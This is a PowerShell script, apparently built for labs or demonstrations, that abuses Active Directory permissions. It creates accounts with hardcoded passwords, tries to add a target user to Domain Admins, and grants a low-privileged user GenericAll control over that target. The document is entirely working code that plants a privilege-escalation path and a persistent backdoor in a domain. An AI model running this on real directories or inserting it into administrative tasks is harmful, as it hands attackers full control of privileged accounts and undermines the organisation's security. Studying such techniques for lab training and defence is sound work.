<#
.SYNOPSIS
Abuses weak ACL permissions to grant a low-privileged user GenericAll rights over a target AD account.
If the users do not exist, the script will create them automatically.

.DESCRIPTION
This script demonstrates ACL/DACL abuse in Active Directory by:
1. Ensuring both the low-privileged user and target user exist (creates them if not).
2. Adding a GenericAll permission for the low-privileged user over the target user.
3. Validating whether the permission was successfully applied.

.REQUIREMENTS
- Permissions to read and write ACLs on the target object (or write access to that object).
- Domain-joined machine.
- ActiveDirectory module (RSAT tools installed).

.PARAMETER TargetUser
The SamAccountName of the target user (e.g., "domainadmin").

.PARAMETER LowPrivUser
The SamAccountName of the low-privileged user to which GenericAll rights will be granted.

.EXAMPLE
PS> .\weak_perms_on_user.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
Grants "low.priv" GenericAll permissions over "domainadmin".
#>

param(
	[Parameter(Mandatory=$true)]
	[string]$TargetUser,

	[Parameter(Mandatory=$true)]
	[string]$LowPrivUser
)

if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Error "ActiveDirectory module not found. Please install RSAT tools."
	exit 1
}
Import-Module ActiveDirectory

# --- Ensure LowPrivUser exists ---
try
{
	$LowPriv = Get-ADUser -Identity $LowPrivUser -ErrorAction Stop
} catch
{
	Write-Host "[*] Low-privileged user '$LowPrivUser' not found. Creating..." -ForegroundColor Yellow
	$LowPriv = New-ADUser -Name $LowPrivUser -SamAccountName $LowPrivUser -AccountPassword (ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force) -Enabled $true
	Write-Host "[+] Created low-privileged user: $LowPrivUser" -ForegroundColor Green
}

# --- Ensure TargetUser exists ---
try
{
	$Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop
} catch
{
	Write-Host "[*] Target user '$TargetUser' not found. Creating with higher privileges..." -ForegroundColor Yellow
	$Target = New-ADUser -Name $TargetUser -SamAccountName $TargetUser -AccountPassword (ConvertTo-SecureString "Adm1nPass!" -AsPlainText -Force) -Enabled $true
	# Try to add to Domain Admins
	try
	{
		Add-ADGroupMember -Identity "Domain Admins" -Members $Target
		Write-Host "[+] Added $TargetUser to 'Domain Admins'" -ForegroundColor Green
	} catch
	{
		Write-Host "[-] Could not add $TargetUser to 'Domain Admins'. Created as regular user." -ForegroundColor Yellow
	}
}

# Refresh user objects after creation
$Target = Get-ADUser -Identity $TargetUser
$LowPriv = Get-ADUser -Identity $LowPrivUser

# --- Abuse ACLs ---
$TargetDN = "LDAP://" + $Target.DistinguishedName
$TargetDE = [ADSI]$TargetDN

# Translate the LowPriv user to SID
$LowPrivSID = (New-Object System.Security.Principal.NTAccount($LowPriv.SamAccountName)).Translate([System.Security.Principal.SecurityIdentifier])

# Get existing ACL
$ACL = $TargetDE.ObjectSecurity

# Create new access rule with GenericAll
$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
	$LowPrivSID,
	[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
	[System.Security.AccessControl.AccessControlType]::Allow
)

# Apply rule
$ACL.AddAccessRule($Rule)
$TargetDE.ObjectSecurity = $ACL
$TargetDE.CommitChanges()

# Confirm that GenericAll was applied
$appliedRule = $ACL.Access | Where-Object {
	($_.IdentityReference -match $LowPriv.SamAccountName -or $_.IdentityReference -match ".*\\$($LowPriv.SamAccountName)") -and $_.ActiveDirectoryRights -match "GenericAll"
}

if ($appliedRule)
{
	Write-Host "[+] Successfully granted GenericAll rights to $($LowPriv.SamAccountName) over $($Target.SamAccountName)" -ForegroundColor Green
	exit 0
} else
{
	Write-Host "[-] Failed to apply GenericAll rights to $($LowPriv.SamAccountName)" -ForegroundColor Red
	exit 1
}
